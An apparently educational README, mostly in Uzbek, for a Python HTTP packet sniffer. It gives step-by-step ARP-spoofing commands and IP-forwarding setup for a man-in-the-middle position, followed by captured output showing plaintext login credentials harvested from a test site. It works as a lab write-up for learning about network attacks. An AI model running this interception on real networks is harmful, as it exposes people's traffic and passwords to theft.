# HTTP Packet Sniffer (Educational Project)

## 📌 Loyihaning tavsifi
Ushbu loyiha **Python (Scapy)** yordamida yozilgan **HTTP packet sniffer** bo‘lib, tarmoq orqali o‘tayotgan **faqat HTTP (port 80)** so‘rovlarini aniqlash va log qilish uchun mo‘ljallangan.

Loyiha **o‘quv va test (lab) muhitlari** uchun yaratilgan bo‘lib, real tarmoqlarda ruxsatsiz foydalanish **taqiqlanadi**.

---

## ⚙️ Qanday ishlaydi?
Sniffer quyidagi prinsip asosida ishlaydi:

- Belgilangan **Target IP** manzildan chiqayotgan trafik kuzatiladi
- Faqat **HTTP so‘rovlari (GET/POST)** aniqlanadi
- URL (Host + Path) log faylga yoziladi
- Agar HTTP payload ichida login/parolga o‘xshash ma’lumotlar aniqlansa, alohida qayd etiladi

📌 **Muhim:**  
Ushbu dastur **HTTPS (443)** trafikni tahlil qilmaydi.

---

## 🧪 Test muhiti va foydalanish shartlari
Sniffer to‘g‘ridan-to‘g‘ri boshqa qurilma trafikini ko‘ra olmaydi. Shu sababli test muhitida:

- Qurilmalar bir xil **Local Area Network (LAN)** ichida bo‘lishi kerak
- Avval **MITM (Man-in-the-Middle)** holati yaratiladi
- Test maqsadida **ARP Spoofing** usuli qo‘llaniladi
- Shundan so‘ng sniffer orqali HTTP trafik kuzatiladi

⚠️ **Eslatma:**  
ARP spoofing va packet sniffing **faqat ruxsat berilgan test muhitida** amalga oshirilishi lozim.

---

## 🚫 Cheklovlar
- ❌ HTTPS trafik tahlil qilinmaydi
- ❌ Shifrlangan ma’lumotlar ko‘rinmaydi
- ❌ Real tarmoqlarda ruxsatsiz ishlatish mumkin emas

---

## 📝 Loglash
- Barcha aniqlangan HTTP so‘rovlar log faylga yoziladi
- Terminaldagi rangli chiqish log faylda toza matn ko‘rinishida saqlanadi

---

## 📚 Texnologiyalar
- Python 3
- Scapy
- argparse
- Linux (Kali Linux test muhitida sinovdan o‘tkazilgan)

---

## ⚖️ Mas’uliyat
Ushbu loyiha **faqat ta’limiy maqsadlar** uchun mo‘ljallangan.  
Muallif loyiha noto‘g‘ri yoki noqonuniy maqsadlarda ishlatilishi uchun javobgar emas.

---

## Hujumni amalga oshirish
Dastlab qiladigan ishimiz ARP-spoofing hujumini amalga oshirish bo'ldi.
Buning uchun Kali Linux da or'natilgan **arpspoof** dasturidan foydalandim yoki o'zim yozib chiqqan https://github.com/UZinfosec404/ARP-spoofing
dasturidan foydalanishingiz mumkin.

1-qadam.Yangi terminalda quyidagi kod ni ishga tushurasiz.
```
arpspoof -i eth0 -t target_ip router_ip 
```
2-qadam.Bu kodni ham yangi terminalda ishga tushurasiz.
```
arpspoof -i eth0 -t router_ip target_ip
```
3-qadam.Agar hujum qilayotgan mashinada internet uzulib qolishi mumkin shuning uchun kelayotgan packetlarni yo'naltirish lozim
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
4-qadam. Sniffer_packet dasturini ishga tushurish.Ishga tushurish uchun root huquqi talab qilinadi.
```
python3 sniffer_packet2.py -h                                                                                                                                                                                                          
usage: sniffer_packet2.py [-h] -t TARGET -i INTERFACE

HTTP Packet Sniffer (faqat lab/test muhitida)

options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target IP manzil (masalan: 192.168.1.10)
  -i, --interface INTERFACE
                        Tarmoq interfeysi (masalan: eth0, wlan0)
```
Biz quyidagicha argumentlarni dasturga kiritamiz:
```
python3 sniffer_packet2.py -t 10.236.108.83 -i wlan0
```
Biz quyidagi natijalarni oldik.Bu dastur faqat http packetlarni filtr qiladi:
```
[*] Sniffer ishga tushdi | Target: 10.236.108.83 | Interface: wlan0
[15:55:55] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:14] [10.236.108.83] >>> testphp.vulnweb.com/userinfo.php
[!] MA'LUMOT TOPILDI: uname=test%40gmail.com&pass=122345
--------------------------------------------------
[15:56:15] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:15] [10.236.108.83] >>> testphp.vulnweb.com/userinfo.php
[!] MA'LUMOT TOPILDI: uname=test%40gmail.com&pass=122345
--------------------------------------------------
[15:56:16] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:35] [10.236.108.83] >>> asilmedia.org/xfsearch/time/-/
[15:56:35] [10.236.108.83] >>> asilmedia.org/A.engine,,_classes,,_min,,_index.php,,qf==engine,,_editor,,_css,,_default.css,,av==62f0e+templates,,_playfilmo,,_css,,_styless.css+templates,,_playfilmo,,_css,,_styles2.css,Mcc.lB8jHmVxYU.css.pagespeed.cf.uBexweltk4.css                                                                                                                                                                
[15:56:35] [10.236.108.83] >>> asilmedia.org/engine/classes/min/index.php,qg=general,av=62f0e.pagespeed.jm.pJg2D_p7ze.js
[15:56:36] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/js/jquery-3.5.1.min.js.pagespeed.jm.c8iSfT9tYL.js
[15:56:36] [10.236.108.83] >>> asilmedia.org/A.engine,,_classes,,_min,,_index.php,,qf==engine,,_editor,,_css,,_default.css,,av==62f0e+templates,,_playfilmo,,_css,,_styless.css+templates,,_playfilmo,,_css,,_styles2.css,Mcc.lB8jHmVxYU.css.pagespeed.cf.uBexweltk4.css                                                                                                                                                                
[15:56:37] [10.236.108.83] >>> asilmedia.org/engine/classes/min/index.php?f=engine/classes/js/jqueryui.js,engine/classes/js/dle_js.js,engine/classes/highslide/highslide.js&v=62f0e
[15:56:39] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/logo/logotype.svg
[15:56:39] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/svg-icon/down-chevron.svg
[15:56:42] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/svg-icon/sprite.svg
^C
```
Chiqqan natija log faylga saqlandi
```
cat target_logs.txt 
[15:01:01] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:01] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:03] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:05] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:09] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:13] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:18] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:26] [10.236.108.201] >>> testphp.vulnweb.com/
[15:01:44] [10.236.108.201] >>> testphp.vulnweb.com/
[15:02:29] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:02:41] [10.236.108.83] >>> testphp.vulnweb.com/userinfo.php
[!] MA'LUMOT TOPILDI: uname=asdsf&pass=dsadgf
--------------------------------------------------
[15:02:41] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:55:55] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:14] [10.236.108.83] >>> testphp.vulnweb.com/userinfo.php
[!] MA'LUMOT TOPILDI: uname=test%40gmail.com&pass=122345
--------------------------------------------------
[15:56:15] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:15] [10.236.108.83] >>> testphp.vulnweb.com/userinfo.php
[!] MA'LUMOT TOPILDI: uname=test%40gmail.com&pass=122345
--------------------------------------------------
[15:56:16] [10.236.108.83] >>> testphp.vulnweb.com/login.php
[15:56:35] [10.236.108.83] >>> asilmedia.org/xfsearch/time/-/
[15:56:35] [10.236.108.83] >>> asilmedia.org/A.engine,,_classes,,_min,,_index.php,,qf==engine,,_editor,,_css,,_default.css,,av==62f0e+templates,,_playfilmo,,_css,,_styless.css+templates,,_playfilmo,,_css,,_styles2.css,Mcc.lB8jHmVxYU.css.pagespeed.cf.uBexweltk4.css
[15:56:35] [10.236.108.83] >>> asilmedia.org/engine/classes/min/index.php,qg=general,av=62f0e.pagespeed.jm.pJg2D_p7ze.js
[15:56:36] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/js/jquery-3.5.1.min.js.pagespeed.jm.c8iSfT9tYL.js
[15:56:36] [10.236.108.83] >>> asilmedia.org/A.engine,,_classes,,_min,,_index.php,,qf==engine,,_editor,,_css,,_default.css,,av==62f0e+templates,,_playfilmo,,_css,,_styless.css+templates,,_playfilmo,,_css,,_styles2.css,Mcc.lB8jHmVxYU.css.pagespeed.cf.uBexweltk4.css
[15:56:37] [10.236.108.83] >>> asilmedia.org/engine/classes/min/index.php?f=engine/classes/js/jqueryui.js,engine/classes/js/dle_js.js,engine/classes/highslide/highslide.js&v=62f0e
[15:56:39] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/logo/logotype.svg
[15:56:39] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/svg-icon/down-chevron.svg
[15:56:42] [10.236.108.83] >>> asilmedia.org/templates/playfilmo/svg-icon/sprite.svg
```
